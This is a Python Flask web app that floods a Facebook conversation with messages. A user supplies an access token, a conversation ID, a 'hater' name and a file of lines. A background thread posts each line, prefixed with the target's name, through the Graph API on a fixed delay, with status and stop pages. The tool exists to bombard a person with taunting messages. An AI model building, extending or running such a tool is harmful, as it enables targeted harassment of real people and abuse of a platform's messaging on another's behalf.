from flask import Flask, request, render_template, redirect, jsonify
import threading, time, random, string, os, requests

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
LOG_FOLDER = 'logs'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(LOG_FOLDER, exist_ok=True)

tasks = {}

def generate_task_id():
    return "manix-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    token = request.form.get('token')
    convo = request.form.get('convo')
    hater = request.form.get('hatersname')
    delay = int(request.form.get('time', 5))
    fbid = request.form.get('fbid')
    np_file = request.files.get('np')
    task_id = generate_task_id()
    
    file_path = None
    if np_file:
        file_path = os.path.join(UPLOAD_FOLDER, f"{task_id}_np.txt")
        np_file.save(file_path)

    log_path = os.path.join(LOG_FOLDER, f"{task_id}.txt")
    stop_event = threading.Event()
    tasks[task_id] = {'stop': stop_event, 'sent': 0, 'running': True, 'log': log_path}

    thread = threading.Thread(target=send_messages, args=(token, convo, hater, delay, fbid, file_path, task_id, stop_event))
    thread.start()
    return f"Task Started! Task ID: <b>{task_id}</b><br><br><a href='/status/{task_id}'>Check Status</a>"

def send_messages(token, convo, hater, delay, fbid, file_path, task_id, stop_event):
    try:
        with open(file_path, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
    except:
        lines = [f"{hater} 😂"]

    log_file = os.path.join(LOG_FOLDER, f"{task_id}.txt")
    with open(log_file, 'a') as log:
        for i, line in enumerate(lines):
            if stop_event.is_set():
                break
            url = f"https://graph.facebook.com/v15.0/t_{convo}/"
            payload = {
                'access_token': token,
                'message': f"{hater} {line}"
            }
            response = requests.post(url, data=payload)
            tasks[task_id]['sent'] += 1
            now = time.strftime('%Y-%m-%d %H:%M:%S')
            if response.ok:
                msg = f"[{now}] SENT ✅: {hater} {line}"
            else:
                msg = f"[{now}] FAIL ❌: {hater} {line} — {response.text}"
            print(msg)
            log.write(msg + "\n")
            log.flush()
            time.sleep(delay)
        tasks[task_id]['running'] = False

@app.route('/status/<task_id>')
def status(task_id):
    task = tasks.get(task_id)
    if not task:
        return f"No such task ID: {task_id}"
    with open(task['log'], 'r') as log:
        lines = log.readlines()
    return f"<b>Task ID:</b> {task_id}<br>Status: {'🟢 Running' if task['running'] else '⛔ Stopped'}<br>Messages Sent: {task['sent']}<br><br><pre>{''.join(lines[-10:])}</pre>"

@app.route('/stop', methods=['POST'])
def stop():
    task_id = request.form.get('task_id')
    task = tasks.get(task_id)
    if not task:
        return f"❌ No task with ID: {task_id}"
    task['stop'].set()
    task['running'] = False
    return f"✅ Task {task_id} stopped successfully."
    
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
